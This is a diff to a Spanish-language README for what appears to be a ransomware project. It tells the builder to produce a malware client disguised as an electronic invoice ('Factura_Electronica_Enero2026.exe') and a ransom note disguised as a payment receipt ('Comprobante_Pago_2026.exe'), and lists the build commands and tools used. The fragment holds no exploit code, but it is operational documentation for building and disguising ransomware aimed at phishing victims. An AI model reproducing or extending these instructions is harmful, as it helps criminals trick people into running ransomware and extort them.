@@ -87,9 +87,11 @@ function doGet(e) {
     ```bash
     npm run build-client
     ```
-3.  El sistema intentará generar varios ejecutables kamikaze en la carpeta `dist/`:
-    *   `Factura_Electronica_Enero2026.exe` (Prioridad)
-    *   `Comprobante_Pago_2026.exe` (Secundario)
+3.  El sistema generará automáticamente **dos artefactos** en la carpeta `dist/`:
+    *   **Cliente (Malware)**: `Factura_Electronica_Enero2026.exe` (Generado con `pkg`).
+    *   **Nota de Rescate**: `Comprobante_Pago_2026.exe` (Generado con `pyinstaller`).
+
+    > **Nota**: Para que se genere la nota de rescate, debes tener Python y `pyinstaller` instalados en el sistema (`pip install pyinstaller`). Si no, solo se generará el cliente.
 
 ---
 
